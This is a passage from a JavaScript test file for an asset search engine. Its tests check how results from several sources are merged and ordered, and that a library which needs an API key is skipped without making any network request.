    const search = new AssetSearch(engine, query(), sources, metas);
    await search.next(() => {});
    expect(search.merged().map((i) => i.title)).toEqual(['One', 'Two', 'Four', 'Three']);
    expect(search.results.every((r) => r.state === 'done')).toBe(true);
    expect(search.hasMore).toBe(false);
    engine.stopAll();
  });

  it('a library that needs a key is skipped until it has one', async () => {
    const code = connector("return { items: [{ id: '1', title: 'x', licence: 'cc0' }] };");
    const { transport, asked } = network([]);
    const engine = new AssetEngine(
      () => transport,
      () => ({}),
    );
    const source = { id: 'probe', code, settings: {} };
    const metas = new Map([['probe', await engine.describe(source)]]);
    const search = new AssetSearch(engine, query(), [source], metas);
    await search.next(() => {});
    expect(search.results[0]?.state).toBe('skipped');
    expect(search.results[0]?.message).toContain('Needs Key');
    expect(asked).toEqual([]);
    engine.stopAll();
  });
});
